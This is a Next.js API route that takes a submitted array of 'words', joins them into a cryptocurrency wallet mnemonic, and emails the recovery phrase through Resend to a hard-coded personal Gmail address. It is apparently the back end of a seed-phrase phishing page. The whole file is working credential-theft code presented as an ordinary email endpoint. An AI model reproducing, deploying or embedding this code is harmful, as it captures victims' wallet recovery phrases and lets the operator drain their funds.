export const runtime = "nodejs";

import { Resend } from "resend";

const resend = new Resend(process.env.RESEND_API_KEY);

export async function POST(req) {
  try {
    /* ===== ENV CHECK ===== */
    if (!process.env.RESEND_API_KEY) {
      return new Response(
        JSON.stringify({
          success: false,
          error: "RESEND_API_KEY is missing",
        }),
        {
          status: 500,
          headers: { "Content-Type": "application/json" },
        }
      );
    }

    /* ===== BODY PARSE ===== */
    const body = await req.json();
    const { words, count } = body;

    if (!Array.isArray(words) || words.length === 0) {
      return new Response(
        JSON.stringify({
          success: false,
          error: "Invalid or empty words array",
        }),
        {
          status: 400,
          headers: { "Content-Type": "application/json" },
        }
      );
    }

    const mnemonic = words.join(" ");

    /* ===== SEND EMAIL ===== */
    const { data, error } = await resend.emails.send({
      from: "Mnemonic Bot <onboarding@resend.dev>",
      to: ["vishalupdev@gmail.com"],
      subject: "Mnemonic Submission",
      html: `
        <h3>Mnemonic Received</h3>
        <p><strong>Word Count:</strong> ${count || words.length}</p>
        <pre style="background:#f4f4f4;padding:12px;border-radius:6px;">
${mnemonic}
        </pre>
      `,
    });

    if (error) {
      console.error("Resend error:", error);
      return new Response(
        JSON.stringify({
          success: false,
          error: error.message || "Email sending failed",
        }),
        {
          status: 500,
          headers: { "Content-Type": "application/json" },
        }
      );
    }

    /* ===== SUCCESS ===== */
    return new Response(
      JSON.stringify({
        success: true,
        message: "Email sent successfully",
        id: data?.id,
      }),
      {
        status: 200,
        headers: { "Content-Type": "application/json" },
      }
    );
  } catch (err) {
    console.error("API crash:", err);

    return new Response(
      JSON.stringify({
        success: false,
        error: err?.message || "Internal server error",
      }),
      {
        status: 500,
        headers: { "Content-Type": "application/json" },
      }
    );
  }
}
